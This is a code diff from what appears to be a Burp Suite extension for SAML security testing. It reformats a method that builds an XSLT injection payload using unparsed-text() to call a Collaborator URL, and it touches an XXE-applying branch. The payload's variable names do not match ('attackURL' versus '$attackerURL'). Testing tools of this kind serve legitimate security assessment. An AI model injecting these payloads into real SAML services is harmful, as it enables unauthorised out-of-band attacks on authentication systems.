@@ -591,24 +591,27 @@ public class SamlTabController implements IMessageEditorTab, Observer {
 		else {
 			SAMLMessage = splitMsg[0]+"?>"+dtd+splitMsg[1];
 			textArea.setText(SAMLMessage.getBytes());
-			setInfoMessageText(XXE_CONTENT_APPLIED);
+			isEdited = true;
+			setInfoMessageText(XML_PARSER_ATTACK_RAW_MODE);
 		}
 	}
-	
+
 	public void applyXSLT(String collabUrl) {
-		String xslt = "\n<ds:Transform>\n"
-				+ "<xsl:template match=\"doc\">\n" + 
-				"<xsl:variable name=\"file\" select=\"'test'\"/>\n" + 
-				"<xsl:variable name=\"escaped\" select=\"encode-for-uri('$file')\"/>" + 
-				"<xsl:variable name=\"attackURL\" select=\"'"+collabUrl+"'\"/>\n" + 
-				"<xsl:variable name=\"exploitURL\" select=\"concat($attackerURL,$escaped)\"/>\n" + 
-				"<xsl:value-of select=\"unparsed-text($exploitURL)\"/>\n" + 
-				"</xsl:template>\n" + 
-				"</xsl:stylesheet>\n" + 
+		String xslt = "\n" +
+				"<ds:Transform>\n" +
+				"  <xsl:stylesheet xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\">\n" +
+				"    <xsl:template match=\"doc\">\n" +
+				"      <xsl:variable name=\"file\" select=\"'test'\"/>\n" +
+				"      <xsl:variable name=\"escaped\" select=\"encode-for-uri('$file')\"/>" +
+				"      <xsl:variable name=\"attackURL\" select=\"'" + collabUrl + "'\"/>\n" +
+				"      <xsl:variable name=\"exploitURL\" select=\"concat($attackerURL,$escaped)\"/>\n" +
+				"      <xsl:value-of select=\"unparsed-text($exploitURL)\"/>\n" +
+				"    </xsl:template>\n" +
+				"  </xsl:stylesheet>\n" +
 				"</ds:Transform>";
 		String transformString = "<ds:Transforms>";
 		int index = orgSAMLMessage.indexOf(transformString);
-		
+
 		if(index == -1) {
 			setInfoMessageText(XML_NOT_SUITABLE_FOR_XLST);
 		}
